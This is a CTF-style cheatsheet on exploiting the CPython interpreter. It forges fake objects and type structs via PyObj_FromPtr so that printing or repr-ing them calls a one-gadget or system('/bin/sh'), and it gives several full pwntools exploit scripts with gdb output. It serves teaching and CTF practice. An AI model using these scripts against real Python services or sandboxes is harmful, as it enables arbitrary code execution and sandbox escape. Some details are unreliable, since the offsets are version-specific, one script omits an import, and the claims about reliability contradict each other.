# Pwning python

## Summary
 - [Strings Introduction](https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/internals/pwning-python/README.md#strings-introduction)
 - [RCE Using PyObj_FromPtr](https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/internals/pwning-python/README.md#using-pyobj_fromptr)
    - [Using One-gadgets](https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/internals/pwning-python/README.md#using-a-one-gadget)
    - [Calling system](https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/internals/pwning-python/README.md#calling-systembinsh)
    - [Calling system without libc leaks](https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/internals/pwning-python/README.md#calling-systembinsh-without-libc-leaks)
    - [Notes](https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/internals/pwning-python/README.md#note)

## Strings introduction

In python, the string is located `0x20`/`0x30` (this depends on the python version) after `id(string)`

(This also applies to the class `bytes`)

Example:

```py
>>> string = "Wow!"
>>> id(string)
140737341202416
```

```py
[running] gef> x/s 140737341202416+0x30
0x7ffff73aa020: "Wow!"
```

## Using PyObj_FromPtr

We can create fake objects in order to gain RCE.
Let's look at the `_typeobject` struct:

```c++
struct _typeobject {
    PyObject_VAR_HEAD
    const char *tp_name; /* For printing, in format "<module>.<name>" */
    Py_ssize_t tp_basicsize, tp_itemsize; /* For allocation */

    /* Methods to implement standard operations */

    destructor tp_dealloc;
    Py_ssize_t tp_vectorcall_offset;
    getattrfunc tp_getattr;
    setattrfunc tp_setattr;
    PyAsyncMethods *tp_as_async; /* formerly known as tp_compare (Python 2)
                                    or tp_reserved (Python 3) */
    reprfunc tp_repr;

    /* Method suites for standard classes */

    PyNumberMethods *tp_as_number;
    PySequenceMethods *tp_as_sequence;
    PyMappingMethods *tp_as_mapping;

    /* More standard operations (here for binary compatibility) */

    hashfunc tp_hash;
    ternaryfunc tp_call;
    reprfunc tp_str;
```

`PyObject_VAR_HEAD` is a macro which expands to:

```c++
Py_ssize_t ob_refcnt;
PyTypeObject *ob_type;
```

We can define a field in order to execute what we want.
An interesting one is `tp_repr`, why? Let's look at the function `PyObject_Str`:

```c++
0x5555556c9f20 <PyObject_Str+320> call   r11
```

If we're able to control the value of `r11`, we can jump to any address we want!

`tp_repr` is going to be called each time we pass an object to `print` or `repr`

Now, we just need to create a fake object with our fake type.
Objects in python are defined as follow:

```c++
typedef struct _object {
    _PyObject_HEAD_EXTRA
    Py_ssize_t ob_refcnt;
    struct _typeobject *ob_type;
} PyObject;

// https://medium.com/@sergioli/how-python-objects-are-implemented-in-c-2f36ff8fb371
```

So we can create an object like this:
`refcount + pointer_to_fake_type`


### Using a one gadget

Since we only call a function without passing arguments to it, we can use a one gadget and hoping it works.

Example:
```py
from pwn import *
from _ctypes import PyObj_FromPtr

context.binary = elf = ELF("/usr/bin/python3")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

zero_libc_offset = 0x156f30 # This may change depending on your Python version. You can find it by doing libc_base_addr-id(0) inside gdb
libc.address = id(0) + zero_libc_offset

print(f"[ + ] libc base address: {hex(libc.address)}")

one_gadget = libc.address + 0xebc88 # run one_gadget libc.so.6
fake_type = flat(one_gadget)*14

fake_object = flat(
    0xdeadbeef, # ref_count
    id(fake_type) + 0x20 # ob_type
)

print(f"[ + ] Fake object id: {hex(id(fake_object))}")

b = PyObj_FromPtr(id(fake_object) + 0x20)

print(b) # Here we trigger tp_repr
```

Result:

<img width="518" alt="img1" src="https://github.com/salvatore-abello/python-ctf-cheatsheet/assets/107145304/c8096f9c-1c1e-42f1-8376-c2c9f616f3de">


And that's it!

But... What if we don't have any one-gadgets!?

Well...

### calling system("/bin/sh")

Somehow, we need to call `system("/bin/sh")`

Luckily for us, when calling `r11`, python will pass the `ref_count` to that function as a first argument:

```c++
*our_function_addr (
   $rdi = 0x00007fffb3b16910 → 0x00000000deadbef1,
   $rsi = 0x0000000000000000,
   $rdx = 0x00007ffff7c52000 → 0x00007ffff7c52000 → [loop detected],
   $rcx = 0x0000555555af7a80 → <_PyRuntime+0> add BYTE PTR [rax], al
)
```

Did you see that? Inside `rdi`, there's a pointer to the `ref_count` we passed before. Let's try putting `/bin/sh` instead of `0xdeadbeef`:

```c++
*our_function_addr (
   $rdi = 0x00007fffb3b16590 → 0x0068732f6e696231 ("1bin/sh"?),
   $rsi = 0x0000000000000000,
   $rdx = 0x00007ffff7c52000 → 0x00007ffff7c52000 → [loop detected],
   $rcx = 0x0000555555af7a80 → <_PyRuntime+0> add BYTE PTR [rax], al
)
```

Something happened to our string. In Python, every time an object is referenced, the `ref_count` is incremented. So we actually need to pass `.bin/sh` instead of `/bin/sh` so, when the object will be referenced, the string becomes `/bin/sh`.

Finally, instead of passing the address of our one-gadget, we pass the address of `system`:

```py
from pwn import *
from _ctypes import PyObj_FromPtr

context.binary = elf = ELF("/usr/bin/python3", checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

zero_libc_offset = 0x156f30 # This may change depending on your Python version. You can find it by doing libc_base_addr-id(0) inside gdb
libc.address = id(0) + zero_libc_offset

print(f"[ + ] libc base address: {hex(libc.address)}")

one_gadget = libc.address + 0xebc88
fake_type = flat(libc.sym['system'])*14

fake_object = flat(
    b'-bin/sh\x00', # ref_count
    id(fake_type) + 0x20 # ob_type
)

print(f"[ + ] Fake object id: {hex(id(fake_object))}")

b = PyObj_FromPtr(id(fake_object) + 0x20)

print(b) # Here we trigger tp_repr
```

And... We got a shell!

<img width="518" alt="img1" src="https://github.com/salvatore-abello/python-ctf-cheatsheet/assets/107145304/c8096f9c-1c1e-42f1-8376-c2c9f616f3de">


### calling system('/bin/sh') without libc leaks
**This exploit works 100% of the time**

```py
from _ctypes import PyObj_FromPtr

context.binary = elf = ELF("/usr/bin/python3", checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

str_base_offset = 0x5737c0
elf.address = id(str) - str_base_offset

print(f"[ + ] elf base address: {hex(elf.address)}")

fake_type_1 = flat(elf.sym['system'])*14

fake_object_1 = flat(
    b'-bin/sh\x00', # ref_count
    id(fake_type_1) + 0x20 # ob_type
)

print(f"[ + ] Fake object id: {hex(id(fake_object_1))}")


b = PyObj_FromPtr(id(fake_object_1) + 0x20)

repr(b)
```

## Note
Since we there are other fields before `tp_repr`, we can trigger the call with something like this:

```py
b.a
```

By using this method, we can pass a second argument to the function we want to call:

```py
# rdi = ref_count
# rsi = attribute name
b.MyAttr
```

<img width="914" alt="image" src="https://github.com/salvatore-abello/python-ctf-cheatsheet/assets/107145304/b0e7f426-db0d-4232-ac0c-1b9f68c0b3c6">


If we decrease the `ref_count` to 0, we can trigger the call without doing nothing!
For example:

```py
from pwn import *
from _ctypes import PyObj_FromPtr

context.binary = elf = ELF("/usr/bin/python3", checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

zero_system_offset = 0x1a7ca0
libc.address = id(0) + zero_system_offset - libc.sym["system"] # The offset will always be the same

print(f"[ + ] libc base address: {hex(libc.address)}")

one_gadget = libc.address + 0xebc81
fake_type = flat(one_gadget)*14

fake_object = flat(
    0, # ref_count
    id(fake_type) + 0x20 # ob_type
)

print(f"[ + ] Fake object id: {hex(id(fake_object))}")

b = PyObj_FromPtr(id(fake_object) + 0x20) # We're not touching the object!
```

**These exploits don't work on the first try. That's becausae we need to bruteforce 4 bits of ASLR. It is recommended to run at least 16 times!**

#### source
https://docs.python.org/3.3/c-api/structures.html#:~:text=%3B%20PyTypeObject%20*ob_type%3B-,PyObject_VAR_HEAD,varies%20from%20instance%20to%20instance.
https://github.com/python/cpython/blob/main/Objects/typeobject.c
